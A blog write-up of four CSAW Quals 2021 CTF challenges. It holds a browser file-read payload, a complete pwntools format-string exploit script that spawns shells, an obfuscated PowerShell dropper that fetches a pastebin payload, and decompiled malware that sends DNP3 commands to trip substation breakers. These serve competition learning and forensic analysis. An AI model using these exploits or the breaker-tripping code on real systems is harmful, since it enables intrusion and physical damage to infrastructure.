+++
title = "CSAW Quals CTF 2021"
date = 2021-09-12

[taxonomies]
tags = ["ctf-writeups"]
+++

I competed in CSAW Quals with [ret2rev](https://ret2rev.dev/).  We ended in 88th place overall and 17th in the qualifying brackets (US Students). I've included writeups for the challenges I solved and thought were interesting enough to write about. 

<!-- more -->


## scp-terminal (web, 497)

```text
Every since you started working this administrative government job, things have gotten strange. It's not just because your day is spent cataloging an archive of anomalous objects. In your dreams you see a burning number: 31337 Maybe this terminal can help uncover the meaning of these dreams.
```

![](/ctf/csaw-quals-2021/scp_terminal_landing.png)

The Explore Archive button opens up a random SCP-wiki page and the Contain SCP button will open up the provided URL on the server and show a screenshot. It'll only work if the URL contains "scp-" so I added "?test=scp-wiki" to the end of the URL to bypass the check. 

### Enumeration

Using the URL "view-source:file:///server?test=scp-wiki" prints a list of all the server files. I used view-source because it wasn't rendering the file listing directly for some reason. 

![](/ctf/csaw-quals-2021/scp_terminal_serverdir.png)

There are a few interesting files there; but let's look at server.py first.

![](/ctf/csaw-quals-2021/scp_terminal_serverpy.png)

Hey, we have arbitrary file read; What if I just view the flag template? 

![](/ctf/csaw-quals-2021/scp_terminal_scp31337.png)

Ahahaha I should've expected that. The next thing I tried was viewing the source, but the viewport wasn't big enough to see the flag. I was stuck on this stage for a while until I found some functionality which let me upload a file to the server by viewing a page like this. 

```html
<html>
<head>
</head>
<body>
<div class="scp-image-block">
	<img  src="http://822f-128-194-3-233.ngrok.io/exploit.html">
</div>
</body>
</html>
```

![](/ctf/csaw-quals-2021/scp_terminal_contain.png)

The server won't serve contained non-image files but it doesn't matter all that much because we have arbitrary file read by way of file://. I actually wrote a payload that worked in my testing, was really excited to test on the server only to find it didn't work -- Firefox considers file <-> file to be the same origin but Chrome does not so I couldn't access the contents of the iframe. I read the documentation on iframes and found the csp attribute; which lets me control the content security policy of the child page. The flag was in the viewport of scp_31337.html, just obfuscated by css. I wrote a quick HTML to iframe the file with CSS disabled and then got the flag. 

```html
<html>
<head>
</head>
<body>
<iframe id="frame" src="file:///server/templates/scp-31337.html"
            title="iframe Example 1" width="720" height="400" csp="style-src none">
</iframe>
</body>
</html>
```
![](/ctf/csaw-quals-2021/scp_terminal_flag.png)

## Procrastination Simulator (pwn, 430)

```text
Oh noes! I partied all weekend and now it's an hour before the CTF ends and I have school deadlines tonight too. Can you help me write 60 reports and pwn 50 challenges by Sunday afternoon? nc auto-pwn.chal.csaw.io 11001 with password cd80d3cd8a479a18bbc9652f3631c61c
```

This was an automatic exploit generation challenge; there were four binary classes spread across 50 levels. Each binary was vulnerable to a format string exploit, with more and more mitigations as they got harder. 
1. 32-bit; No PIE; Win function to shell. Overwrite GOT for exit to win function
2. 64-bit; No PIE; Win function to shell. Overwrite GOT for exit to win function but had to construct the payload a little different bc of null bytes in 64-bit addresses. 
3. 64-bit; No PIE; Win function to shell; Stripped symbols so we had to locate the win function by searching for a string of bytes. 
4. 64-bit; PIE; No win function; We get three payloads. I leaked the program base and libc bases off the stack, overwrote GOT memset with system, and then passed "/bin/sh" for the last time -- calling system("/bin/sh"). 

```python
#!/usr/bin/env python3

from pwn import *
import os
import re
context.terminal = "kitty"




def exploit_1(port, password, shell):

    r = remote("auto-pwn.chal.csaw.io", port)
    r.sendline(password)
    r.recvuntil(b"---\n")
    binary = r.recvuntil(b"-------------------\n").rstrip().replace(b"-------------------------------------------------------------------",b"")
    open("binary.hex","wb").write(binary)
    os.system("xxd -rp binary.hex > binary")
    exe = ELF("binary")
    lower = (exe.sym['win'] - 10) & 0xffff
    upper = exe.sym['win'] >> 16
    payload = flat([
        b"BB",
        p32(exe.got['exit']),
        p32(exe.got['exit']+2),
        f"%{lower}c".encode(),
        b"%6$hn",
    ])
    open("payload.bin","wb").write(password + b"\n" + payload)
    r.sendline(payload)
    r.sendline("cat message.txt;ls;exit")
    if shell:
        r.interactive()
    r.recvuntil(b"flag is in another box! ")
    # print()
    message = r.recvline().decode()
    print(message)
    searched = re.search("auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)", message)
    if shell:
        r.interactive()
    r.close()

    return (int(searched.group(1)), searched.group(2).encode())

def exploit_2(port, password, shell):

    r = remote("auto-pwn.chal.csaw.io", port)
    r.sendline(password)
    r.recvuntil(b"---\n")
    binary = r.recvuntil(b"-------------------\n").rstrip().replace(b"-------------------------------------------------------------------",b"")
    open("binary.hex","wb").write(binary)
    os.system("xxd -rp binary.hex > binary")
    exe = ELF("binary")
    lower = (exe.sym['win'] - 10) & 0xffff
    upper = exe.sym['win'] >> 16
    payload = flat([
        f"%{exe.sym['win'] & 0xffff}c".encode(),
        b"C" * (8 - len(str(exe.sym['win'] & 0xffff)) + 1) ,
        b"%8$hn",
        p64(exe.got['exit']),
    ])
    open("payload.bin","wb").write(password + b"\n" + payload)
    r.sendline(payload)
    r.sendline("cat message.txt;ls;exit")
    if shell:
        r.interactive()
    r.recvuntil(b"flag is in another box! ")
    # print()
    message = r.recvline().decode()
    print(message)
    searched = re.search("auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)", message)
    if shell:
        r.interactive()
    r.close()

    return (int(searched.group(1)), searched.group(2).encode())

def exploit_3(port, password, shell):
    from binascii import unhexlify
    r = remote("auto-pwn.chal.csaw.io", port)
    # r = process("./binary")
    r.sendline(password)
    r.recvuntil(b"---\n")
    binary = r.recvuntil(b"-------------------\n").rstrip().replace(b"-------------------------------------------------------------------",b"")
    open("binary.hex","wb").write(binary)
    os.system("xxd -rp binary.hex > binary")
    exe = ELF("binary")
    win = next(exe.search(unhexlify("f30f1efa554889e5488d")))
    payload = flat([
        f"%{win & 0xffff}c".encode(),
        b"C" * (8 - len(str(win & 0xffff)) + 1) ,
        b"%8$hn",
        p64(exe.got['exit']),
    ])
    open("payload.bin","wb").write(password + b"\n" + payload)
    r.sendline(payload)
    r.sendline("cat message.txt;ls;exit")
    if shell:
        r.interactive()
    r.recvuntil(b"flag is in another box! ")
    # print()
    message = r.recvline().decode()
    print(message)
    searched = re.search("auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)", message)
    if shell:
        r.interactive()
    r.close()

    return (int(searched.group(1)), searched.group(2).encode())


def exploit_4(port, password, shell):
    from binascii import unhexlify
    r = remote("auto-pwn.chal.csaw.io", port)
    # r = gdb.debug("./binary",gdbscript="b fgets\nc")
    r.sendline(password)
    r.recvuntil(b"---\n")
    binary = r.recvuntil(b"-------------------\n").rstrip().replace(b"-------------------------------------------------------------------",b"")
    open("binary.hex","wb").write(binary)
    os.system("xxd -rp binary.hex > binary")
    # r.interactive()
    exe = ELF("binary")
    payload = b"%7$lx.%45$lx"
    f = open("payload.bin","wb")
    f.write(password + b"\n" + payload)
    r.sendline(payload)
    r.recvuntil(b"Report 1:\n")
    prog, libc = r.recvline().decode().split(".")
    program_base, libc_base = (int(prog, 16) - 0x374c, int(libc, 16) - 0x270b3)
    memset_got = program_base + 0x36b8
    system_addr = libc_base + 0x55410
    free_hook = libc_base + 0x000000000039b788
    one_gadget = libc_base + 0x3f35a
    log.info(f"program base: {hex(program_base)}, libc base: {hex(libc_base)}")
    log.info(f"memset_got: {hex(memset_got)}, system_addr: {hex(system_addr)}")
    context.bits = 64
    context.arch = 'amd64'
    def exec_fmt(payload):
        p = exe.process()
        p.sendline(password)
        p.recvuntil(b"Report 1 in this batch!!\n")
        p.sendline(payload)
        p.sendline()
        p.sendline()
        return p.recvall()
    
    payload = fmtstr_payload(8, {memset_got: system_addr}, write_size='byte')
    r.sendline(payload)
    r.sendline("/bin/sh")
    import time
    time.sleep(1)
    r.sendline("cat message.txt")
    if shell:
        r.interactive()
    r.recvuntil(b"flag is in another box! ")
    message = r.recvline().decode()
    print(message)
    searched = re.search("auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)", message)
    if shell:
        r.interactive()
    r.close()

    return (int(searched.group(1)), searched.group(2).encode())

def main():
    number = 0

    data = [(11001,b"cd80d3cd8a479a18bbc9652f3631c61c")]

    for i in range(15):
        print(number)
        number += 1
        next_port, next_password = data[-1]
        next_port, next_password = exploit_1(next_port, next_password, False)
        data.append((next_port, next_password))
        print((next_port, next_password))
    for i in range(15):
        print(number)
        number += 1
        next_port, next_password = data[-1]
        next_port, next_password = exploit_2(next_port, next_password, False)
        data.append((next_port, next_password))
        print((next_port, next_password))
    for i in range(15):
        print(number)
        number += 1
        next_port, next_password = data[-1]
        next_port, next_password = exploit_3(next_port, next_password, False)
        data.append((next_port, next_password))
        print((next_port, next_password))
    for i in range(16):
        print(number)
        number += 1
        next_port, next_password = data[-1]
        next_port, next_password = exploit_4(next_port, next_password, number == 50)
        data.append((next_port, next_password))
        print((next_port, next_password))

if __name__ == "__main__":
    main()
```
![](/ctf/csaw-quals-2021/aeg_flag.png)

## haySTACK (pwn, 290)

```text
Help! I've lost my favorite needle!

nc pwn.chal.csaw.io 5002
```
[haySTACK](/ctf/csaw-quals-2021/haySTACK)

![](/ctf/csaw-quals-2021/haystack_function.png)

🧐

The only vulnerability I caught was an underflow in the haystack check -- it checked the upper bound but not the lower bound so we could guess any location on the stack. It also displays 4 bytes at the guessed location. I guessed with a negative number to leak the randomly generated location for the needle and then guessed that location. 

![](/ctf/csaw-quals-2021/haystack_flag.png)

## tripping breakers (ics, 481)

```text
Attached is a forensics capture of an HMI (human machine interface) containing scheduled tasks, registry hives, and user profile of an operator account. There is a scheduled task that executed in April 2021 that tripped various breakers by sending DNP3 messages. We would like your help clarifying some information. What was the IP address of the substation_c, and how many total breakers were tripped by this scheduled task? Flag format: flag{IP-Address:# of breakers}. For example if substation_c's IP address was 192.168.1.2 and there were 45 total breakers tripped, the flag would be flag{192.168.1.2:45}.
```

Looking around the filesystem finds us this lovely powershell script in Temp. 

```powershell
$SCOP = ((new-object System.Net.WebClient).DownloadString("https://pastebin.com/raw/rBXHdE85")).Replace("!","f").Replace("@","q").Replace("#","z").Replace("<","B").Replace("%","K").Replace("^","O").Replace("&","T").Replace("*","Y").Replace("[","4").Replace("]","9").Replace("{","=");$SLPH = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($SCOP)); $E=(Get-ItemProperty -Path $SLPH -Name Blast)."Blast";$TWR =  "!M[[pcU09%d^kV&l#9*0XFd]cVG93<".Replace("!","SEt").Replace("@","q").Replace("#","jcm").Replace("<","ZXI=").Replace("%","GVF").Replace("^","BU").Replace("&","cTW").Replace("*","zb2Z").Replace("[","T").Replace("]","iZW1").Replace("{","Fdi");$BRN = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($TWR)); $D= (Get-ItemProperty -Path $BRN -Name Off)."Off";openssl aes-256-cbc -a -A -d -salt -md sha256 -in $env:temp$D -pass pass:$E -out "c:\1\fate.exe";
```

```text
❯ cat Registry/SOFTWARE_ROOT.json | jq | grep -i "tabletpc..bell" -A 10 -B 3
              "LastWriteTimestamp": "/Date(1617231964815)/",
              "SubKeys": [
                {
                  "KeyPath": "ROOT\\Microsoft\\Windows\\TabletPC\\Bell",
                  "KeyName": "Bell",
                  "LastWriteTimestamp": "/Date(1617231990846)/",
                  "SubKeys": [],
                  "Values": [
                    {
                      "ValueName": "Blast",
                      "ValueType": "RegSz",
                      "ValueData": "M4RK_MY_W0Rd5",
                      "DataRaw": "TQA0AFIASwBfAE0AWQBfAFcAMABSAGQANQAAAA==",
                      "Slack": ""
❯ cat Registry/SOFTWARE_ROOT.json | jq | grep -i "wbem..tower" -A 10 -B 3
              "Values": []
            },
            {
              "KeyPath": "ROOT\\Microsoft\\Wbem\\Tower",
              "KeyName": "Tower",
              "LastWriteTimestamp": "/Date(1617231936549)/",
              "SubKeys": [],
              "Values": [
                {
                  "ValueName": "Off",
                  "ValueType": "RegSz",
                  "ValueData": "\\EOTW\\151.txt",
                  "DataRaw": "XABFAE8AVABXAFwAMQA1ADEALgB0AHgAdAAAAA==",
                  "Slack": ""
```

So, turns out Powershell actually exists on Linux -- I used it to evaluate these subcommands. The more you know!  It decrypts EOTW\151.txt with "M4RK_MY_W0Rd5" as the password and then runs the result, so I run it to decrypt fate.exe. I opened it up in Binary Ninja, cried a little bit, and then realized it was a package python script with PyInstaller. I hit it with [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) and uncompyle6 to get this lightly modified python file. 

```python
# uncompyle6 version 3.7.4
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.0 (default, Mar  3 2017, 23:25:37) 
# [GCC 5.3.0]
# Embedded file name: trip_breakers.py
import struct, socket, time, sys
from crccheck.crc import Crc16Dnp
OPT_1 = 3
OPT_2 = 4
OPT_3 = 66
OPT_4 = 129

class Substation:

    def __init__(self, ip_address, devices):
        self.target = ip_address
        self.devices = []
        self.src = 50
        self.transport_seq = 0
        self.app_seq = 10
        for device in devices:
            self.add_device(device)

        self.connect()

    def connect(self):
        print('Connecting to {}...'.format(self.target))
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect(("127.0.0.1", 20000))
        print('Connected to {}'.format(self.target))

    def add_device(self, device):
        self.devices.append({'dst':device[0],  'count':device[1]})

    def activate_all_breakers(self, code):
        for device in self.devices:
            dnp3_header = self.get_dnp3_header(device['dst'])
            for x in range(1, device['count'] * 2, 2):
                global count
                dnp3_packet = dnp3_header + self.get_dnp3_data(x, OPT_1, code)
                self.socket.send(dnp3_packet)
                # time.sleep(2)
                dnp3_packet = dnp3_header + self.get_dnp3_data(x, OPT_2, code)
                self.socket.send(dnp3_packet)
                # time.sleep(5)

    def get_dnp3_header(self, dst):
        data = struct.pack('<H2B2H', 25605, 24, 196, dst, self.src)
        data += struct.pack('<H', Crc16Dnp.calc(data))
        return data

    def get_dnp3_data(self, index, function, code):
        data = struct.pack('<10BIH', 192 + self.transport_seq, 192 + self.app_seq, function, 12, 1, 23, 1, index, code, 1, 500, 0)
        data += struct.pack('<H', Crc16Dnp.calc(data))
        data += struct.pack('<HBH', 0, 0, 65535)
        self.transport_seq += 1
        self.app_seq += 1
        if self.transport_seq >= 62:
            self.transport_seq = 0
        if self.app_seq >= 62:
            self.app_seq = 0
        return data


def main():
    # if socket.gethostname() != 'hmi':
    #     sys.exit(1)
    substation_a = Substation('10.95.101.80', [(2, 4), (19, 8)])
    substation_b = Substation('10.95.101.81', [(9, 5), (8, 7), (20, 12), (15, 19)])
    substation_c = Substation('10.95.101.82', [(14, 14), (9, 16), (15, 4), (12, 5)])
    substation_d = Substation('10.95.101.83', [(20, 17), (16, 8), (8, 14)])
    substation_e = Substation('10.95.101.84', [(12, 4), (13, 5), (4, 2), (11, 9)])
    substation_f = Substation('10.95.101.85', [(1, 4), (3, 9)])
    substation_g = Substation('10.95.101.86', [(10, 14), (20, 7), (27, 4)])
    substation_h = Substation('10.95.101.87', [(4, 1), (10, 9), (13, 6), (5, 21)])
    substation_i = Substation('10.95.101.88', [(14, 13), (19, 2), (8, 6), (17, 8)])
    substation_a.activate_all_breakers(OPT_3)
    substation_b.activate_all_breakers(OPT_4)
    substation_c.activate_all_breakers(OPT_4)
    substation_d.activate_all_breakers(OPT_4)
    substation_e.activate_all_breakers(OPT_3)
    substation_f.activate_all_breakers(OPT_4)
    substation_g.activate_all_breakers(OPT_3)
    substation_h.activate_all_breakers(OPT_4)
    substation_i.activate_all_breakers(OPT_4)


if __name__ == '__main__':
    main()
# okay decompiling fate.exe_extracted/trip_breakers.pyc
```

I modified it to connect to localhost so I could packet capture it and then opened it up in wireshark. I applied some filters to only measure tripped breakers (re: OPT_4) and counted the number remaining to get the flag. 

flag{10.95.101.82:200}